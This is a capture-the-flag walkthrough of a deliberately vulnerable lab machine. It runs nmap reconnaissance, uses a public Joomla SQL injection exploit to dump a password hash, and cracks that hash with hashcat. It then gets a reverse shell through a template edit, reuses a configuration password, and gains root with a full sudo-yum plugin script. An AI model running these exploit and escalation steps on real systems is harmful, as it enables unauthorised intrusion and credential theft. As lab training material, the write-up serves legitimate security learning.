# Daily Bugle

"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."

## Preparation

Added IP to /etc/hosts as "daily.hack"

## Recon

Identifying OS with ping.
```
monty@localhost:~/ctfs/thm/daily-bugle$ ping daily.hack
...
64 bytes from daily.hack (10.10.150.4): icmp_seq=2 ttl=61 time=340 ms
```

61 TTL, likely Linux.

Identifying open ports (from default 1000).
```
nmap -r -v -A -oA recon/nmap/1000-fingerprinting daily.hack
...
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)                                                                    
| ssh-hostkey:                                                                                                       
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management 
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/  
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```

Identifying all open ports.
```
nmap -r -v -p- -T4 -oA recon/nmap/allports daily.hack
...
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```
No new ports.

Running searchsploit on the nmap output.
```
searchsploit --nmap recon/nmap/1000-fingerprinting.xml
```

Nothing sticks out. Poking around the webserver.

### HTTP (80/TCP)

Landing page contains a login form and a possible username: "Written by Super User"

Joomla login page at: http://daily.hack/administrator/index.php (found via robots.txt)

Found administrator subdirectory that is public: http://daily.hack/administrator/templates/isis/images/ (found with OWASP ZAP)

The files were created in April 2017, looking at Joomla releases. It is likely 3.7 given that the files were last modified the same day that 3.7 released.

## Cracking the Perimeter

Googling "Joomla SQL Injection" returns the following CVE: CVE-2017-8917

Used https://github.com/XiphosResearch/exploits/tree/master/Joomblah

```
python joomblah.py http://daily.hack/
...
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

```
monty@localhost:~/ctfs/thm/daily-bugle/ctp$ hashid jonah.hash 
--File 'jonah.hash'--
Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'jonah.hash'--monty@localhost:~/ctfs/thm/daily-bugle/ctp$ hashcat --example-hashes | grep -A 2 -B 2 'Blowfish(OpenBSD)'
monty@localhost:~/ctfs/thm/daily-bugle/ctp$ hashcat --example-hashes | grep -A 2 -B 2 'Blowfish'

MODE: 3200
TYPE: bcrypt $2*$, Blowfish (Unix)
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
PASS: hashcat
```

Looks like Blowfish.
```
hashcat --session=daily-bugle -a 0 -m 3200 jonah.hash /home/monty/ctfs/htb/challenges/you-know-0xdiablos/rockyou.txt
```

Cracked: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123

jonah:spiderman123

Logged into the Joomla admin panel with those credentials: http://daily.hack/administrator/index.php

Looks like we can upload files under "Media", trying a PHP webshell, using shellclip to generate.

Cannot get them to upload, tried the following:
rev.inc
rev.phtml
rev.png
rev.jpg
rev.php5
rev.php
rev.php2
rev.php4
rev.php3

Editing the index.php file in template beez3 to be a reverse shell. Clicked "Template Preview" to execute. Got a shell.

## Privilege Escalation

We cannot sudo, no interesting SUIDs.

Uploaded linpeas.sh

```
bash linpeas.sh
...
[+] Useful software                                                                                                  
/usr/bin/nmap
...
[+] Searching passwords in config PHP files
public $password = 'nv5uz9r3ZEDzVjNu';
...
[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/var/www/html/libraries/joomla/http/transport/cacert.pem                                                                      
```

Looking for any interesting files owned by jjameson and SSH files.

```
bash-4.2$ find / -type f -user jjameson 2> /dev/null
/var/spool/mail/jjameson
bash-4.2$ cat /var/spool/mail/jjameson
cat: /var/spool/mail/jjameson: Permission denied
bash-4.2$ ls /home/jjameson/.ssh
ls: cannot access /home/jjameson/.ssh: Permission denied
bash-4.2$ cat /home/jjameson/.ssh/id_rsa
cat: /home/jjameson/.ssh/id_rsa: Permission denied
bash-4.2$ cat /home/jjameson/.ssh/id_rsa.pub
cat: /home/jjameson/.ssh/id_rsa.pub: Permission denied
```

nv5uz9r3ZEDzVjNu is the password to jjameson (ssh enabled)

local:jjameson:nv5uz9r3ZEDzVjNu

/home/jjameson/user.txt

Checking sudo
```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Used GTFOBins template for creating a plugin that execute /bin/sh
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Got root.
```
sh-4.2# id; hostname
uid=0(root) gid=0(root) groups=0(root)
dailybugle
```